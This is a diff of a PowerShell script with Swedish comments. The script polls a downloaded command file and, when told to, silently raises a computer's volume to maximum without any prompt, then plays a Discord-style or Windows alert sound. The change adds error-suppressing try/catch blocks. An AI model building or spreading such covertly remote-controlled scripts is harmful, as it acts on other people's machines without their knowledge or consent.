@@ -87,20 +87,29 @@ while ($true) {
             $command = (Get-Content -Path $commandDownloadPath -Raw).Trim()
 
             if ($command -eq "1" -or $command -eq "2") {
-                # Höj volymen till 100% helt osynligt utan popup-ruta
-                [SysTools]::SetVolume(1.0)
+                try {
+                    # Höj volymen till 100% helt osynligt utan popup-ruta
+                    [SysTools]::SetVolume(1.0)
+                } catch {
+                    # Ignorera om volymen inte kan ändras (t.ex. om inga högtalare är inkopplade)
+                }
+                
                 Start-Sleep -Milliseconds 500
 
-                if ($command -eq "1") {
-                    # Spela den lokala discord.wav-filen om den existerar
-                    if (Test-Path $soundPath) {
-                        $soundPlayer = New-Object System.Media.SoundPlayer
-                        $soundPlayer.SoundLocation = $soundPath
-                        $soundPlayer.Play()
+                try {
+                    if ($command -eq "1") {
+                        # Spela den lokala discord.wav-filen om den existerar
+                        if (Test-Path $soundPath) {
+                            $soundPlayer = New-Object System.Media.SoundPlayer
+                            $soundPlayer.SoundLocation = $soundPath
+                            $soundPlayer.Play()
+                        }
+                    } elseif ($command -eq "2") {
+                        # Spela Windows vanliga notifikationsljud (Exclamation)
+                        [System.Media.SystemSounds]::Exclamation.Play()
                     }
-                } elseif ($command -eq "2") {
-                    # Spela Windows vanliga notifikationsljud (Exclamation)
-                    [System.Media.SystemSounds]::Exclamation.Play()
+                } catch {
+                    # Ignorera om ljudet inte kan spelas upp
                 }
             }
             # Uppdatera den lokala kontrollfilen så kommandot bara körs en gång per ändring
